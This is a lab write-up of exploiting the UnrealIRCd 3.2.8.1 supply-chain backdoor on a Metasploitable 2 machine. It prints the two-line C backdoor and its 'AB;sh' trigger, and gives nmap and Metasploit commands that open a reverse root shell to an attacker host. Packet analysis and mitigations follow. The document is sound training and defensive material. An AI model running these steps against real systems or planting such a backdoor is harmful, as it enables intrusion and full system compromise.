# UnrealIRCd 3.2.8.1 Backdoor — Metasploitable 2

## What is UnrealIRCd?
UnrealIRCd is an open source IRC (Internet Relay Chat) server — think of it as the grandfather of modern platforms like Discord and Slack. It allows users to connect, join channels, and communicate in real time over **port 6667**.

---

## The Vulnerability
This is not a typical software flaw — it is a **supply chain attack**.

Between November 2009 and June 2010, an attacker secretly replaced the official UnrealIRCd source code with a backdoored version. It went undetected for 7 months. The malicious insertion was just two lines of C code:

```c
if(strncmp(readbuf, "AB;", 3) == 0)
    system(readbuf+3);
```

Any data starting with `AB;` sent to port 6667 would be executed as a system command. Sending `AB;sh` spawned a shell instantly.

---

## Why Root Access?
> **When you exploit a service, you inherit its permissions on that system.**

UnrealIRCd was running as root. So our shell spawned as root. No privilege escalation needed. This is a textbook violation of the **principle of least privilege**.

---

## Execution

**Recon:**
```bash
nmap -sV -O 192.168.56.109
# Port 6667 — UnrealIRCd identified
```

**Exploit:**
```bash
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.56.109
set LHOST 192.168.56.110
set payload cmd/unix/reverse
exploit
```

**Result:**
```
whoami
root
```

---

## Traffic Analysis
Traffic was captured on both Wireshark and tcpdump simultaneously.

| Packet | Event |
|--------|-------|
| 211 | IRC `Request (AB;sh)` — backdoor triggered |
| 215-216 | SYN/SYN-ACK — reverse shell connecting to Kali on port 4444 |
| 236 | RST/ACK — session closed |

Packet 211 is the smoking gun — the exact malicious string visible in plain text.

**Why a reverse shell?** The target connects back to the attacker instead of the other way around — bypassing inbound firewall restrictions.

---

## Mitigation
- Upgrade UnrealIRCd and verify integrity with cryptographic checksums
- Never run services as root — apply principle of least privilege
- Monitor for unexpected outbound connections from IRC processes

---

## Key Takeaway
Two lines of malicious code in legitimate software combined with a misconfigured root service = full system compromise. The same supply chain concept that brought down SolarWinds in 2020 was demonstrated here on a smaller scale.

> *"When you exploit a service, you inherit its permissions on that system."*

---

## Tools Used
Nmap · Metasploit · Wireshark · tcpdump · Security Onion
